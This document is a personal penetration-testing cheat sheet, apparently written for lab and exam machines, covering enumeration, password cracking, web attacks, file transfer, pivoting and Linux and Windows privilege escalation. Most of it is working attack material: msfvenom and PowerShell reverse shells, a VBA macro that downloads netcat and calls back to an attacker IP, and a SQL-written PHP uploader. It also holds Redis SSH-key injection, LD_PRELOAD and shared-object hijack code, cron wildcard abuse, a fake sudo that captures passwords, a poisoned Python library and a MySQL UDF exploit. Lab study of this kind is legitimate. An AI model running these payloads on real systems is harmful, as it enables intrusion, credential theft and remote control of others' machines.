# <span style="color:rgb(11, 142, 224)">Troubleshooting : </span>

MTU/packet fragmentation
Issue : 
If terminals get stuck 
If RDP screen is black 
If websites are not loading 

Reconnect to VPN

Lower MTU:
try lowering the MTU to below 1250. We recommend decreasing it in increments of 50 until the connection becomes stable, but please do not set it below 700.
```
sudo ip link set dev tun0 mtu 1350
```
Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
```
sudo chattr -i /etc/resolv.conf

sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""
```
# <span style="color:rgb(11, 142, 224)">Initial Access </span>

##### <span style="color:rgb(11, 142, 224)">Methodology : </span>

try every cred you find everywhere, password reuse shows up a lot

1. Enumerate
- Nmap → ports, services, versions
- Check ftp anonymous/ smb nullguest for smb, default creds, configs/files, users
- Credential finding locations : landing page, every shown pages, directory,  look for names, username, password , weird string could be a username or password , name, email, street name, description, file
- Can't find password ? try username as password. spray this credentials to other service
- Reuse every credential everywhere : login page If you found

2. Web
- WhatWeb → tech + versions → `"version CVE"` (if doesnt work the first time then it doesnt work)
- Browse pages, source, comments, JS, files
- Hunt creds: names, emails, descriptions, `.git` + history
- Gobuster + SecLists → dirs/files : then sub directory again
- Check subdomains

3. Identify
- Public/CMS → CVE → WPScan / JoomScan / Nikto
- Custom → test functionality

4. Common Vectors
- SQLi → Boolean / UNION (add an extra - at the end of SQLi for it to work sometimes)
- File upload → extension/header/.htaccess bypasses (if its apache you can try uploading .htaccess)
- LFI / RFI
- Path Traversal
- Log Poisoning
- Command Injection

5. Exploit + Chain
- Validate CVE → exploit
- LFI + upload → code execution
- `.git` → source/secrets → creds
- Creds → other services
- Upload + misconfig → code execution

#### <span style="color:rgb(11, 142, 224)">Port Scanning : </span>

Nmap 
```
sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
```

When the TCP scan finishes, immediately run a UDP scan.
```
sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
```

#### <span style="color:rgb(11, 142, 224)">Password cracking : </span>

Whenever you find a hash, first try [https://crackstation.net/](https://crackstation.net/)
If that doesn't work, try John the Ripper or Hashcat. Let it run for not more than 10 minutes.

Google it first, use hashes.org,
then try `rockyou.txt` wordlist with both hashcat and john. Because sometimes one tool cracks but the other doesn’t. So always try both. Max time I would before moving on is like 15 min. If it still doesn’t crack it’s highly likely that it’s not the intended way.

john will automatically identify the hashing algorithm
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
For Password Hashes from SAM and SYSTEM files : 
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
```
Format : `RID : LM hash : NT hash`
#### <span style="color:rgb(11, 142, 224)">SSH into a user</span>
To SSH into a user using a private key:
```
ssh -i <private_key> <username>@<target_ip>
```
#### <span style="color:rgb(11, 142, 224)">Stable Shell : </span>

And we have a shell as www / $ , Get a tty (stable shell) shell using, 
```
python -c "import pty; pty.spawn('/bin/bash')"
```
#### <span style="color:rgb(11, 142, 224)">SMB null guest login</span>



#### <span style="color:rgb(11, 142, 224)">FTP anonymous login</span>

Connect:
```
ftp 10.129.47.240
```
When prompted:
```
Name: anonymous
Password: anonymous
```
Then enumerate everything:
```
ls -la
```

confirm FTP is writable
On your FTP session:
```
put test.txt
```
If it says:
```
226 Transfer complete
```
then the directory is writable.

Use MSFvenom to generate the aspx payload.
```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.138 LPORT=4444 -o reverse-shell.aspx
```
Then, we’ll upload the generated payload on the FTP server and confirm that it has been uploaded.
```
put reverse-shell.aspx
```
check 
```
ls 
```

Start listener on kali
```
nc -nlvp 4444
```

In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP server.
```
http://10.129.47.240/reverse-shell.aspx
```
Go back to your listener to see if the shell connected back.

#### <span style="color:rgb(11, 142, 224)">Web Application </span>

###### <span style="color:rgb(11, 142, 224)">Enumeration : </span>

Directory brute forcing : 
Gobuster
smaller : 
```
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
```
larger : 
use medium list now
```
sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
```

go to website 
```
/about.html
```

Wordpress enumeration 
```
wpscan --url http:<IP> -e ap,at,u
```

###### <span style="color:rgb(11, 142, 224)">Default Credentials : </span>

of username : password same you found , 
admin:admin etc

phpmyadmin : 
username : root 
password : leave empty (in some versions it's "password")

Zabbix : 

###### <span style="color:rgb(11, 142, 224)">SQL Injection : </span>

If website has executable SQL commands : 
Php get upload option to upload any file on website itself 
```
https://gist.github.com/BababaBlue
```
code :
```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
after that , upload `PHP Ivan Sincek` revershell to the website
###### <span style="color:rgb(11, 142, 224)">Squid Proxy :</span>
configure FoxyProxy extension 
with port number and ip address of victim machine 
and then load the website 
remember to turn off also when visiting other websites
###### <span style="color:rgb(11, 142, 224)">Macro :</span>
```vb
Sub MyMacro
	Dim str as String
	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
	Shell(str)
End Sub
```

Alternative: Automating with Metasploit
Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
Generate the Payload : 
```bash
msfconsole
use exploit/multi/fileformat/openoffice_document_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
This outputs a ready-to-upload `.odt` file.

Catch the Shell :
```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
```
sessions -i 1
```
###### <span style="color:rgb(11, 142, 224)">Redis</span> 

```
redis-cli -h <IP> # to connect to the server

after connecting : 
info                            # to get information/details about the server
SELECT <database_index>         # select databse
keys *                          # to key all key names
get <Key name>                  # to get value of the key 
config get dir                  # to get config directory for redis
config set dir /var/lib/redis/.ssh>  # to set a new directory

ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
ls -la ~/.ssh/     # to see kali public ssh key 
( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 

cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key

config set dbfilename "authorized_keys"    # write our key to redis disk 
save                                       # to save the file now

ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
```

# <span style="color:rgb(11, 142, 224)">File Transfer</span>

### <span style="color:rgb(11, 142, 224)">If file not downloading : </span>

The error `Access to the path 'C:\nc.exe' is denied` occurs because you're trying to save `nc.exe` directly in `C:\`, and your current user does not have permission to write there.

check for your writeable permissions in current folder : 
```
icacls .
```
switch folders until you get look for  W (Write-only access)* , M (Modify access), F (Full access)

switch to temp folder 
```
cd C:\Temp
```

switch to users 
```
cd C:\
dir
icacls .
```
switch to public 
```
cd C:\Users\Public
```

----
### <span style="color:rgb(11, 142, 224)">Kali Linux → Windows</span> 

Start server on kali : 
you won't be able to start on 80 on victim machine if it already has something running (for Linux victims)
```
python3 -m http.server 8000
```

Windows get file : 
CMD (1st priority) : 
```
certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
```
PowerShell : 
```
powershell iwr http://KALI_IP:8000/filename -o filename

powershell -Command "iwr 'http://<kali ip>:8000/reverse.exe' -OutFile 'C:\Program Files\File Permissions Service\filepermservice.exe'"
```

<span style="color:rgb(11, 142, 224)">If you want to download directly to a path :</span>
<span style="color:rgb(11, 142, 224)">KEEP NAME OF .EXE SAME AS THAT OF `service name.exe`</span>
```
certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
```

<span style="color:rgb(11, 142, 224)">or if you want in current directory : </span>
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```
<span style="color:rgb(11, 142, 224)">then transfer to desire directory : </span>
```
move <file name from current folder> <full path with with file name>
```

### <span style="color:rgb(11, 142, 224)">Windows → Kali Linux using SMB</span>
On Kali start SMB server : 
```
impacket-smbserver share . 
# if error - wants smb2 : 
impacket-smbserver share . -smb2support
```
On windows transfer files : 
```
copy <input file name> \\<kali ip>\share\<output file name>
# ex. copy windows.txt \\192.168.131.128\share\windows.txt
```

If errors : 
```
on attacker machine : 
impacket-smbserver -smb2support randomname . -username user -password password

on victim machine : 
net use z: \\192.168.45.206\test /u:test test
dir z:
```
here , "randomname" is just a random name given , and can give any username and password 
"." here is work in the current directory
authentication required as some servers so not accept without auth

-----
### <span style="color:rgb(11, 142, 224)">Netcat (to get shell back on kali and not use windows rdp): </span>

Download 64 bit netcat : 
if required then download 32 bit x86 netcat
```
https://github.com/int0x33/nc.exe/
```
RDP into target
```bash
xfreerdp /v:10.49.147.79 /u:user /p:password321 /cert:ignore /dynamic-resolution
```
start python server
```bash
python3 -m http.server 8000
```
on windows , get file from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/nc64.exe -o nc64.exe
```
start listener on kali : 
```bash
rlwrap -f . nc -lvnp 4444
```
on windows execute rev shell : 
```cmd
nc64.exe -e cmd.exe 192.168.163.199 4444
```

-----
### Linux get file : 
```
wget http://<ip>:8000/filename -O filename
curl http://<ip>/filename -o filename

nc <victim ip> 4444 < filename     # sender 
nc -lvnp 4444 > filename           # receiver
```


# <span style="color:rgb(11, 142, 224)">Reverse Shells : </span>

<span style="color:rgb(11, 142, 224)">if we didn't wanted a call back to our listener using a reverse shell<br>we could have gotten system in same shell as well</span>
```
PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
```

go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)

<span style="color:rgb(11, 142, 224)">For 64 bit windows : </span>
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
<span style="color:rgb(11, 142, 224)">For 32 bit x86 architecture : </span>
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```

#### <span style="color:rgb(11, 142, 224)">PowerShell : </span>
Exploit Script : 
replace the kali ip here 
Use single quotes for the outer PowerShell string and keep the inner command in double quotes:
```
$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.163.199:8000/mypowershell.ps1'')"'
```

with your reverse shell looking like:
Payload script : 
replace the kali ip here 
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
you should get a shell on your Netcat listener on port 4444

#### Reverse shell in Metasploit Multi Handler : 

Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
create reverse shell For Metasploit Meterpreter handler : 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```
transfer to windows 
now back on kali start listener 
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.174 [Kali VM IP Address] 
set lport 4444
run
```
now run our reverse shell on windows : 
```
reverse.exe
```
# <span style="color:rgb(11, 142, 224)">Port Forwarding/Pivoting </span>

after gaining initial access , to <span style="color:rgb(11, 142, 224)">discover more devices on same network</span> use nmap to scan
download from : (on kali attacker machine)
```
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
```
transfer to victim machine , then run : 
```
./nmap -sn <victim ip>/24     # /24 since only last octet is changing in subnet
```
remove first (gateway) and last ip (broadcast)
now check which machine you can access now 
```
./nmap -p0-100 -vv <different left ips>
```

<span style="color:rgb(11, 142, 224)">SSH : </span>
to do local port forwarding :
```
ssh -L <attacker local port>:<target ip>:<target port> root@<through which ip> -i id_rsa -fN 

localhost:8000      # now everything visible on this 
127.0.0.1:8000
```
to do remote port forwarding :
```
ssh -R <local port to open>:<which final internal network machine ip>:<which target port to forward to of internal network machine> kali@<kali ip> -fN
```
to do dynamic port forwarding : (on kali)
```
ssh -D 9050 -i id_rsa root@<ip to forward traffic to>
```


<span style="color:rgb(11, 142, 224)">Chisel : </span>
```
sudo apt install chisel     #kali linux - attacker 

https://github.com/jpillora/chisel/releases/tag/v1.12.0   # windows 
chisel_1.12.0_windows_amd64.zip
```
Attacker / Kali — start server : 
```
chisel server -p 8080 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:<CHISEL_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

<span style="color:rgb(11, 142, 224)">Chisel with SOCKS (for dynamic port forwarding):</span>
```
sudo gedit /etc/proxychains.conf
add line in last : socks5 127.0.0.1 9050
```
Attacker / Kali — start server : 
```
chisel server -p 8000 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
#chisel.exe client 10.10.10.5:8000 R:9050:socks
```

# <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>

##### <span style="color:rgb(11, 142, 224)">Methodology : </span>

1. enumerate the services very hard
2. Use linpeas, pspy
##### General : 

Linux has `tmp` folder , which is world writeable
```
cd /tmp
```

GTFO Bins Wayback : https://web.archive.org/web/20260102075820/https://gtfobins.github.io/#view

Find Flag 
```
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```
##### <span style="color:rgb(11, 142, 224)">SUDO exploitation : </span>

###### <span style="color:rgb(11, 142, 224)">Shell Escape Sequences : </span>
programs "user" allowed to run via sudo
```
sudo -l 
```
go to gtfo bins
and use sudo before command as `sudo <command>`
###### <span style="color:rgb(11, 142, 224)">Environment Variables : </span>
```
sudo -l 
```
Look for :
```
env_keep += LD_PRELOAD
env_keep += LD_LIBRARY_PATH
```

<span style="color:rgb(11, 142, 224)">for LD_PRELOAD : </span>
make exploit 
```
nano preload.c
```
paste code : 
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
compile it 
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
This creates:
```
/tmp/preload.so
```
Then run one of the permitted programs while specifying the library:
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
#ex. any of the complete paths from the `sudo -l` list like "/usr/sbin/apache2"
# not all executables will work , try until one works
```

<span style="color:rgb(11, 142, 224)">for LD<i>LIBRARY</i>PATH : </span>
Find which shared libraries the target binary depends on after seeing from `sudo -l`
```
ldd /usr/sbin/apache2
# or you can use any executable path from `sudo -l` results
```
Pick a library name from this list — e.g. **`libcrypt.so.1`** ; not all libraries will work , try until one works
Create your own library : 
```
nano library_path.c
```
paste code : / Create the Malicious Shared Object : 
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
compile it : 
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
#put the library name from the list we found out 
```
run : 
```
sudo LD_LIBRARY_PATH=/tmp apache2
# use same executable you choose in starting whose you saw library path for 
```

##### <span style="color:rgb(11, 142, 224)">SUID Executables : </span>
###### <span style="color:rgb(11, 142, 224)">Known exploits : </span>
Find all the SUID/SGID executables on the Debian VM
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```
find / -user root -perm /4000 2>/dev/null
```
Find known exploit for `versions` found of executables on searchsploit , Google, and GitHub
or go to gtfo bins 
###### <span style="color:rgb(11, 142, 224)">SUID shared object (.so) injection : </span>
find a `-so` executables
then run this to check the files its asking for but not available 
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# replace the file name with the shared file name/location
```
ex we get its asking for another shared object : `/home/user/.config/libcalc.so`
create that directory by `mkdir /home/user/.config`
go inside that directory and create a exploit : 
```
nano exploit.c
```
and paste this code 
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
give permission `chmod +x exploit.c`
compile the code to that location it asks for 
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so exploit.c
```
now again run the initial executable
```
/usr/local/bin/suid-so
# run directly , you will get a root shell now
```
###### <span style="color:rgb(11, 142, 224)">Environment Variables (without absolute service path) : </span>
find if you have any env files : `/usr/local/bin/suid-env`
Find what it executes : `strings /usr/local/bin/suid-env`
see if it starts any service without proving the full path
if no , create an exploit : 
```
nano service.c
```
and paste the code :
```
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
Compile it:
```
gcc -o service service.c
```
Put your directory first in PATH
```
PATH=.:$PATH
# "." means: the current directory
```
now just run the executable again : 
```
/usr/local/bin/suid-env
```

Environment Variables (without absolute service path) : will work only for bash version less than 4.0
##### <span style="color:rgb(11, 142, 224)">Cron tabs :</span>

Go to `crontab.guru` website and enter cron tab to see what it means
`*/5` - at every 5th minute
ex. `* * * * * kali /bin/bash /home/kali/Downloads/code/code.sh`
add user name and shell also
###### <span style="color:rgb(11, 142, 224)">Weak File Permissions : </span>
minute ; hour ; day of month ; month ; day of week
```
1. View System-wide crontab: cat /etc/crontab
2. check if path is writeable
3. locate <filename>
```
replace content of file with : 
```
#!/bin/bash
<put bash reverse shell>
# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
```
and start listener on kali
```
nc -nvlp 4444
```
###### <span style="color:rgb(11, 142, 224)">PATH Manipulation : </span>
View the contents of the system-wide crontab:  
```
cat /etc/crontab
```
Note that the PATH variable starts with **/home/user** which is our user's home directory.
Create a file called **overwrite.sh** in your home directory with the following contents:
```
#!/bin/bash  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
or 
change the path ! 
```
export PATH=/tmp:$PATH
# export PATH=<directory which you want to add to path>:$PATH
# echo $PATH
```
###### <span style="color:rgb(11, 142, 224)">Wild Cards :</span>
cat the cron job file 
if it has `tar czf /tmp/backup.tar.gz *`
check gtfo bin if it has `-- option name` available or not
then in the path it takes , create these files : 
Create a script that will run as root:
```
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```
Make it executable:
```
chmod +x shell.sh
```
Now create the malicious filenames:
```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
Check them:
```
ls -la
```
After it cron executes (ex. after every minute) , check:
```
ls -l /tmp/rootbash
```
Then:
```
/tmp/rootbash -p
```

##### <span style="color:rgb(11, 142, 224)">Process Snooping with pspy :</span>
download pspy 64 bit from 
https://github.com/dominicbreuker/pspy
now transfer the pspy file to the victim machine
give permissions : 
```
chmod +x pspy64 
```
run : 
```
./pspy64 
```
UID=0 is for processes run by root

ex. if uid=0 is running `sudo cat /etc/shadow ` again and again 
but we can do path hijacking since the sudo is not having a defined path 
create a new file in `/tmp` : 
```
cd /tmp
```
make sudo file of ours : 
```
nano sudo 
```
enter script : 
```
#!/bin/bash

read frank_pass
echo $frank_pass > /tmp/frank_pass
# it will print what user enters in /tmp folder 
# go and see by `ls -al /tmp` then cat that `cat /tmp/frank_pass`
```
give it permissions to execute
```
chmod +x sudo
```
we go to home and edit the `.bashrc` file 
```
nano .bashrc
```
in starting only after the comments , add line 
```
PATH=/tmp:$PATH
```
save and exit 
now to update the PATH we run : 
```
source .bashrc
```
now we wait till the user enetrs the password after running sudo and we get the password
now cat into the file in `/tmp` to see the file
now we will fix the sudo in the `~/.bashrc` file 
remove the `/tmp` entry we made in PATH line , keep rest PATH line as it is
save and exit
again save by source
```
source .bashrc
```
or use full path for sudo since path is updated now 
```
/usr/bin/sudo su
```

Attack vector 2 : 
if the file path is mentioned but what all libraries it uses in the files are modifiable : 
for ex. if root is running : `/opt/server_admin/reporter.py `
check if we can overwrite it : 
```
tmp$ ls -al /opt/server_admin/reporter.py 
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
```
it is using absolute path so we cant change it 
now see the contents of the file :
```
cat /opt/server_admin/reporter.py
```
if it is using 
```
import os
#os.system(command)
```
it is using `import os` and then a system command 
so well change the contents of that `os` library itself
The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:
```
- Directory of the script being executed
- /usr/lib/python2.7
- /usr/lib/python2.7/plat-x86_64-linux-gnu
- /usr/lib/python2.7/lib-tk
- /usr/lib/python2.7/lib-old
- /usr/lib/python2.7/lib-dynload
- /usr/local/lib/python2.7/dist-packages
- /usr/lib/python2.7/dist-packages
```
For other distributions, run the command below to get an ordered list of directories:
```
python -c 'import sys; print "\n".join(sys.path)'
```
so we see 1 by 1 all the folder where that library is present
for ex. we found it in 
```
/usr/lib/python2.7$ ls -al
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
```
we found `os.py` file here
which was being used in the python file as `import os`
we have write permission also on this 
now we edit the python file 
```
/usr/lib/python2.7$ nano os.py
```
in the last of the file , add a reverse shell of python 
we dont need to import os since we are already in os 
remove semicolons also `;` and `import os` and `os.<filename>`
so our revesere shell will become 
```
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.138",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```
start a reverse listener on kali 
```
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap -cAr nc -lvnp 4444
```
paste it in last of `os.py` file and save and exit
now we wait to get root shell on our kali 

##### <span style="color:rgb(11, 142, 224)">Others : </span>

<span style="color:rgb(11, 142, 224)">Kernel Exploits : </span>
get the kernel version of machine first
```
uname -a
```
then search on google for ex. `Linux debian 2.6.32-5-amd64 exploit`
or go to exploit db and serach for `linux kernel <version number>`
```
searchsploit -m <exploit full name/path>
```
use only verified exploits and prefer `.c` exploits , not `c++`
now download it to kali and start a python server and transfer the exploit to victim machine
now compile the `.c` code , see the exploit code for the compiling code
```
# gcc exploit.c –o exploit
# g++ exploit.c –o exploit
```
then run : 
```
./<new compiled filename>
```

<span style="color:rgb(11, 142, 224)">Linux Capabilities : </span>
```
getcap -r / 2>/dev/null
```
see which all has SUID bit set ex. `cap_setuid+ep`
go to gtfo bins now to see
if `:py` doesn't work , use `:python3`
ex. for `vim` : `./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
for `view` : `./view -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
for ex. if python has it set : `/usr/bin/python2.6 -c "import os; os.setuid(0); os.system('/bin/bash')"

also see if it has `cap_dac_read_search+ep` capability set 
for ex. if `./vim` has it 
you run command `./vim /etc/shadow` to read any file

<span style="color:rgb(11, 142, 224)">Network File System (NFS) : </span>
Check the NFS share configuration on the victim machine :
```
cat /etc/exports
```
if it has entry like `/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
which confirms : 
we can see that `/tmp` was exported with `no_root_squash` enabled and `rw` which is read , write the `sync` option shows whatever we will write will be synced on the server immediately as well
and the wildcard `*` tells any hostname can mount this folder
i.e any machine on this network can mount this machine 
alternatively we can use nmap also
```
nmap --script=nfs-showmount <victim ip>
```
it shows victim is exporting `/tmp` folder 
and the wildcard `*` shows anyone on network can mount
now use sudo user always on kali 
we make a new temporary folder in which we will mount 
```
mkdir /tmp/nfs
```
now well mount it 
```
sudo mount -t nfs <victim ip>
# sudo mount -o rw,vers=3 -t nfs <victim ip>:<which folder is mountable> /tmp/nfs
```
now we go to the location we mounted 
```
cd /tmp/nfs
ls -al
```
we are now able to see the server files here
we copy the own bash of the target mahcine into the its own nfs folder first 
```
<victim machine command in the nfs folder>:/tmp$ cp /bin/bash .
```
then we copy it to our `/tmp` on our own kali for a copy
```
┌──(root㉿kali)-[/tmp]
└─# cp /tmp/nfs/bash .
```
then we remove it from the nfs as root from kali
```
┌──(root㉿kali)-[/tmp/nfs]
└─# rm -rf bash
```
then we cd into the nfs as root and copy the version of bash into the nfs 
```
┌──(root㉿kali)-[/tmp]
└─# cd nfs            
┌──(root㉿kali)-[/tmp/nfs]
└─# cp /tmp/bash . 
```
we give it suid and execute permission 
```
┌──(root㉿kali)-[/tmp/nfs]
└─# chmod +xs bash 
```
now we execute it on the victim go get root shell
```
user@debian:/tmp$ ./bash -p
```


<span style="color:rgb(11, 142, 224)">Service Exploits (MySQL) : </span>
Identifying the vulnerability : 
check if mysql is running as root : 
```
ps aux | grep mysql | grep root
```
check if you can login without password : 
```
mysql –u root
```
go to exploit db to get exploit and search for `mysql udf`
https://www.exploit-db.com/exploits/1518
download the exploit 
transfer the code form kali to victim machine 
follow the commands mentioned on how to compile 
```
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
execute these commands one by one after logging into mysql : 
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**)
run to gain a shell running with root privileges:
```
/tmp/rootbash -p
```

<span style="color:rgb(11, 142, 224)">read bash (commands and password entered) history : </span>
```
cat ~/.*history
# .zsh_history ; python history ; mysql history
```
<span style="color:rgb(11, 142, 224)">ssh keys : </span>
```
cd /home/kali/.ssh
/root/.ssh

#if you get it : chmod 600 id_rsa
```
<span style="color:rgb(11, 142, 224)">browser saved passwords : </span>
```
git clone https://github.com/alessandroz/lazagne
```
<span style="color:rgb(11, 142, 224)">password files readable/writeable : </span>
```
ls -la /etc/passwd
ls -la /etc/shadow

# create a new passowrd hash and paste it there : 
openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
```

If nothing works , then try Linpeas
# <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>

#### <span style="color:rgb(11, 142, 224)">Methodology : </span>

- Quick check C:\ drive for non default folders.
- `tree /F /A .` on C:/Users/ directory, look for suspicious files.
- Quick check Program Files to find non default Software
- Run `whoami /all`, then PrivEscCheck, then PowerUp, then WinPEAS.
- The above will give you all info you need. Save output and slowly go over it.
- If you get completely stuck, you can manually check for things too.
##### <span style="color:rgb(11, 142, 224)">General : </span>

Find Flag 
do manually first : `users > desktop/documents`
```
where /r C:\ local.txt
where /r C:\ proof.txt
```

<span style="color:rgb(11, 142, 224)">if we didn't wanted a call back to our listener using a reverse shell</span>
<span style="color:rgb(11, 142, 224)">we could have gotten system in same shell as well</span>
```
PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
# instead of reverse.exe we replaces it with cmd location
```

<span style="color:rgb(11, 142, 224)">To check for our permissions on a file : </span>
switch to PowerShell : 
```
powershell
```
run : 
```
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
```
check for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
check for `Everyone`
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 
or 
```
icacls .
# "." here is current folder , for a location enter folder location
```

<span style="color:rgb(11, 142, 224)">Admin to System privilege escalation :</span>
To get a local service shell if you are an admin 
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```
get `PSExec64.exe` and a reverse shell in same folder
from here check `whoami /priv` or try other methods and escalate to system
Check "Windows UAC Bypass" for Admin Medium to High Integrity privilege escalation

<span style="color:rgb(11, 142, 224)">If in powershell you are unable to execute scripts : </span>
```
powershell -executionpolicy bypass
```
###### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>

BLACK SCREEN : lower mtu to 1000
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
```
or
When it isn't connecting : 
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
```
or 
```
xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
```
Enter the password when prompted.

Transfer `nc.exe` to windows and get a reverse shell : 
Download 64 bit netcat : 
